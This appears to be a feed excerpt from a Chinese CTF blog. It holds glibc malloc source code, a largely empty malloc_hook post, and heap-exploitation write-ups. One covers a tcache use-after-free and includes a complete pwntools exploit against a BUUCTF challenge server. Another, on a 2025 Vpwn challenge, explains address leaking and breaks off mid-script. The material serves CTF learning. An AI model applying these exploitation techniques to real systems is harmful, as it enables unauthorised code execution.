class="line"><span class="comment">         The particular case of skipping all bins during warm-up phases</span></span><br><span class="line"><span class="comment">         when no chunks have been returned yet is faster than it might look.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      ++idx;</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      block = idx2block (idx);</span><br><span class="line">      <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">      bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (;; )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">          <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">              bit = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">          <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">              assert (bit != <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">          victim = last (bin);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">          <span class="keyword">if</span> (victim == bin)</span><br><span class="line">            &#123;</span><br><span class="line">              av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">              bin = next_bin (bin);</span><br><span class="line">              bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">              assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* unlink */</span></span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);</span><br><span class="line">                  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                  <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>malloc相关宏定义</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*申请的堆块对齐的宏定义*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta"># <span class="keyword">if</span> !SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_16)</span></span><br><span class="line"><span class="comment">/* This is the correct definition when there is no past ABI to constrain it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Among configurations with a past ABI constraint, it differs from</span></span><br><span class="line"><span class="comment">   2*SIZE_SZ only on powerpc32.  For the time being, changing this is</span></span><br><span class="line"><span class="comment">   causing more compatibility problems due to malloc_get_state and</span></span><br><span class="line"><span class="comment">   malloc_set_state than will returning blocks not adequately aligned for</span></span><br><span class="line"><span class="comment">   long double objects under -mlong-double-128.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span></span><br><span class="line"><span class="meta">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The corresponding bit mask value */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br></pre></td></tr></table></figure></details><h2 id="malloc_hook的位置"><a class="markdownIt-Anchor" href="#malloc_hook的位置"></a> malloc_hook的位置</h2><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><ul><li>在<code>how2heap</code>这个仓库中并没有关于<code>malloc_hook</code>的，也有可能是结合在其他堆利用中，所以我就找了其他师傅的博客。</li></ul><h1 id="利用方式"><a class="markdownIt-Anchor" href="#利用方式"></a> 利用方式</h1><ul><li>这边<code>malloc_hook</code>的利用方式其实是需要和其他漏洞利用去打组合计。<code>malloc_hook</code>只是在最后一步<code>getshell</code>中才比较起作用。</li><li><code>malloc_hook</code>就是让我们直接修改这个<code>malloc_hook</code>函数指针的值，使得我们在执行<code>malloc()</code>函数的时候就可以被钩到我们指定的地址中，最后就会<code>getshell</code></li><li>这边就先介绍一下一些组合计。</li></ul><h2 id="利用方式1"><a class="markdownIt-Anchor" href="#利用方式1"></a> 利用方式1</h2><h2 id="利用方式2"><a class="markdownIt-Anchor" href="#利用方式2"></a> 利用方式2</h2><h1 id="malloc_hook_level_1"><a class="markdownIt-Anchor" href="#malloc_hook_level_1"></a> malloc_hook_level_1</h1><h1 id="malloc_hook_level_2"><a class="markdownIt-Anchor" href="#malloc_hook_level_2"></a> malloc_hook_level_2</h1><h1 id="malloc_hook_level_3"><a class="markdownIt-Anchor" href="#malloc_hook_level_3"></a> malloc_hook_level_3</h1><h1 id="malloc_hook_level_4"><a class="markdownIt-Anchor" href="#malloc_hook_level_4"></a> malloc_hook_level_4</h1><h1 id="malloc_hook_level_5"><a class="markdownIt-Anchor" href="#malloc_hook_level_5"></a> malloc_hook_level_5</h1>]]></content>
    
    
    <summary type="html">前言：学习一下hook技术,先学习malloc,之后还有free_hook和realloc_hook</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>tcache_attack</title>
    <link href="http://iyheart.github.io/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/"/>
    <id>http://iyheart.github.io/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/</id>
    <published>2025-01-24T13:14:02.000Z</published>
    <updated>2025-01-24T16:40:30.532Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tcache_uaf"><a class="markdownIt-Anchor" href="#tcache_uaf"></a> tcache_UAF</h1><h2 id="tcache_uaf_level_1"><a class="markdownIt-Anchor" href="#tcache_uaf_level_1"></a> tcache_UAF_level_1</h2><ul><li>题目来源：<a href="https://buuoj.cn/challenges">BUUCTF在线评测</a>，[BJDCTF 2nd]ydsneedgirlfriend2</li></ul><h3 id="tcache_uaf_level_1_分析1"><a class="markdownIt-Anchor" href="#tcache_uaf_level_1_分析1"></a> tcache_UAF_level_1_分析1</h3><ul><li>先<code>check</code>一下题目附件，发现没有开启<code>pie</code>保护。</li></ul><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124211842138-1737736556173-1.png" alt="image-20250124211842138"></p><ul><li><p>然后对该附件进行逆向分析，使用<code>IDA pro</code>将该附件反编译，得到如下结果</p><ul><li><p>函数的具体执行流程就是先输出菜单，然后要求用户输入选项（输入字符形式的1、2、3、4）</p></li><li><p>然后<code>atoi</code>就会将用户输入的字符形式的数字，转换为整型（这个过程就是然用户选择）</p></li><li><p>选择1执行<code>add</code>操作，选择2执行<code>dele</code>，选择3执行<code>show</code>，选择4执行<code>exit</code></p></li></ul></li></ul><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124211858977-1737736594989-3.png" alt="image-20250124211858977"></p><ul><li><p>之后就先查看<code>add()</code>函数执行的操作</p><ul><li><p>先检查申请堆块的个数有没超过7个，没操作7个就会先申请一个<code>0x10</code>大小的堆块,该堆块后<code>0x8</code>字节存放打印函数的地址</p></li><li><p>之后申请用户指定的堆块,将该堆块地址，存入之前申请堆块的前<code>0x8</code>字节中</p></li><li><p>再向用户可以指定申请的堆块输入内容。</p></li><li><p>最后<code>count</code>自增</p></li></ul></li></ul><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124211914205-1737736615573-5.png" alt="image-20250124211914205"></p><ul><li>这边有两个全局变量<code>count</code>（整型的全局变量），<code>girlfriends</code>（指针类型的全局变量），准确来说是一个指针数组的全局变量有7个元素<code>girlfriends[7]</code></li></ul><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124211929366-1737736639043-7.png" alt="image-20250124211929366"></p><ul><li>所以整个堆块的结构就如下：</li></ul><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124211938914-1737736652806-9.png" alt="image-20250124211938914"></p><ul><li>接下来查看<code>dele</code><ul><li>大致逻辑就是，释放用户指定索引的堆块并且存在<code>uaf</code>漏洞</li></ul></li></ul><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124211954265-1737736664104-11.png" alt="image-20250124211954265"></p><ul><li>查看<code>show</code>函数<ul><li>利用函数指针的形式调用自定义函数，输出<code>girlfriend_name</code>堆块的内容</li></ul></li></ul><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124212004880-1737736677971-13.png" alt="image-20250124212004880"></p><ul><li>还发现有一个后门函数，可以直接<code>getshell</code></li></ul><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124212016579-1737736688652-15.png" alt="image-20250124212016579"></p><h3 id="tcache_uaf_level_1_分析2"><a class="markdownIt-Anchor" href="#tcache_uaf_level_1_分析2"></a> tcache_UAF_level_1_分析2</h3><ul><li>这题的基本思路就是通过<code>UAF</code>漏洞，将<code>0x10</code>的那个堆块，申请到用来写入<code>name</code>的堆块，然后我们修改<code>print_girlfriend_name</code>的地址为<code>backdoor</code>的地址，之后再通过<code>show</code>调用<code>print_girlfriend_name</code>的地址，实际上我们去调用的是<code>backdoor</code>。</li><li>通过动态调试发现，只有<code>girlfriend[0]</code>这个可以输出内容和释放堆块。</li></ul><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124212028249-1737736698343-17.png" alt="image-20250124212028249"></p><ul><li>所以我们一开始要申请一个<code>size</code>位不是<code>0x20</code>的堆块，再释放这两个堆块，此时<code>girlfriend[0]</code>没有置0，就会导致<code>uaf</code>。</li></ul><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124212045665-1737736719053-21.png" alt="image-20250124212045665"></p><ul><li>当我们再次申请一个堆块的时候就会发现，<code>add</code>的这一步不会再执行一遍。</li></ul><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124212055516-1737736794255-25.png" alt="image-20250124212055516"></p><ul><li>所以当我们再次申请一个<code>size</code>为<code>0x20</code>大小的堆块，就会将<code>girlfriend[0]</code>所指向的堆块申请回来，我们这时就可以对该堆块进行修改。直接将该堆块修改为<code>backdoor</code>函数的地址，再调用<code>show</code>函数就可以<code>getshell</code></li></ul><h3 id="tcache_uaf_level_1_exp"><a class="markdownIt-Anchor" href="#tcache_uaf_level_1_exp"></a> tcache_UAF_level_1_exp</h3><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26182</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ydsneedgirlfriend2&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;u choice :\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;of her name:\n&#x27;</span>,<span class="built_in">str</span>(length).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;me her name:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;u choice :\n&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;u choice :\n&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(index).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">100</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0x6020A0</span>+<span class="number">0x30</span>)+p64(<span class="number">0x400D86</span>))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/01/24/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-attack/image-20250124212127392-1737736785862-23.png" alt="image-20250124212127392"></p>]]></content>
    
    
    <summary type="html">前言：归纳一下tcache_attack</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>2025西湖论剑</title>
    <link href="http://iyheart.github.io/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <id>http://iyheart.github.io/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</id>
    <published>2025-01-18T16:01:08.000Z</published>
    <updated>2025-01-21T15:20:04.622Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> PWN</h1><h2 id="vpwn"><a class="markdownIt-Anchor" href="#vpwn"></a> Vpwn</h2><h3 id="vpwn_分析1"><a class="markdownIt-Anchor" href="#vpwn_分析1"></a> Vpwn_分析1</h3><ul><li>这题折磨人，QAQ</li><li>先查看一下这个，先查看一下这个程序的保护机制。发现保护全开。</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118163120917.png" alt="image-20250118163120917"></p><ul><li>然后打开使用<code>IDA</code>对该程序进行逆向分析，先从<code>main</code>函数开始分析<ul><li>在<code>main</code>函数中，先是有一个菜单，该菜单表示着对栈的一些操作<code>push</code>、<code>pop</code>、<code>print</code>、<code>Edit</code>、<code>exit</code></li><li>然后还发现字节数组<code>v8</code>这边是存储栈上的数据，我们输入的数据是<code>int32</code>类型。并且在<code>v8[24]</code>这个地方保存着<code>push</code>的栈数量（即控制着这个数组的索引值）</li><li>这里就会发现一个问题，当我们对第7次<code>push</code>的时候，我们<code>push</code>的值就会就会改变索引值，从而导致不正常的索引</li></ul></li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118163250002.png" alt="image-20250118163250002"></p><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118163643773.png" alt="image-20250118163643773"></p><ul><li>之后查看其他函数，先来查看<code>update</code>函数，我们先输入需要修改的索引值，让后将这个索引值和字节数组<code>v8</code>都传入进行<ul><li>这边先会判断是否超出索引，超出索引后会抛出异常，并且结束该函数，继续新一轮循环</li><li>如果没出现异常，就会进行更新值的操作。</li></ul></li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118164009251.png" alt="image-20250118164009251"></p><ul><li>接下来查看<code>push</code>这个函数的操作，我们输入要压入栈中的值，然后就可以进行压栈操作</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118164246448.png" alt="image-20250118164246448"></p><ul><li><code>pop</code>函数也是一样，我们调用<code>pop</code>函数的时候直接进行出栈操作，并且在弹栈之前会先判断栈是否为空。如果栈是空的话就会抛出异常</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118164410563.png" alt="image-20250118164410563"></p><ul><li>接下来<code>print</code>函数，就是打印栈上的内容</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118164509672.png" alt="image-20250118164509672"></p><ul><li>之后就是错误选择的处理和退出选项</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118164721123.png" alt="image-20250118164721123"></p><h3 id="vpwn_分析2"><a class="markdownIt-Anchor" href="#vpwn_分析2"></a> Vpwn_分析2</h3><ul><li>接下来进行动态调试，在动态调试的过程中会发现，存储栈索引的位置在如下图中的位置即<code>glibcxx.</code>的上方</li></ul><p>![image-20250118165006976](CTFblog/write up系列blog/2025年西湖论剑线上赛/image-20250118165006976.png)</p><ul><li>当我们<code>push</code>6次的时候发现所以是6，是正常的情况</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118165147992.png" alt="image-20250118165147992"></p><ul><li>但是当我们<code>push</code>第7次的时候就会出现如下情况，原本索引值为7的，接下来变成了<code>0x20</code></li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118165246956.png" alt="image-20250118165246956"></p><ul><li>这时我们就可以对栈进行非法的操作，我们使用<code>print</code>操作，将栈上的某些地址泄露出来，并且可以使用<code>push</code>操作，修改一些返回地址</li><li>我们先来查看栈上的数据，看看这些数据有什么情况，我们发现这个位置，距离返回地址和程序地址比较近，并且通过计算，如果索引为<code>0x20</code>泄露栈<code>__libc_start_call_main+128</code>的地址是可以的，并且还可以泄露程序的地址<code>0x556ed6e03329</code>，这样程序地址和返回地址就可以泄露出来了，通过计算偏移就可以得到程序基地址，和libc的基地址。</li></ul><p><img src="/2025/01/19/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/image-20250118165516944.png" alt="image-20250118165516944"></p><ul><li>泄露地址的时候这里要注意一下，字符串格式化输出的的<code>int</code>类型的数据是有正负的，如果直接对该数字字符转成Python中的int类型的数据，会出现一点问题，这时候需要位操作来处理接收后的数据</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">low,high</span>):</span><br><span class="line">    <span class="keyword">if</span> low &lt; <span class="number">0</span>:</span><br><span class="line">        low =<span class="built_in">hex</span>((low + (<span class="number">1</span> &lt;&lt; <span class="number">32</span>)) % (<span class="number">1</span> &lt;&lt; <span class="number">32</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;hex_low&#x27;</span>,low)</span><br><span class="line">        start_main_addr = <span class="built_in">hex</span>(high)+low[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span 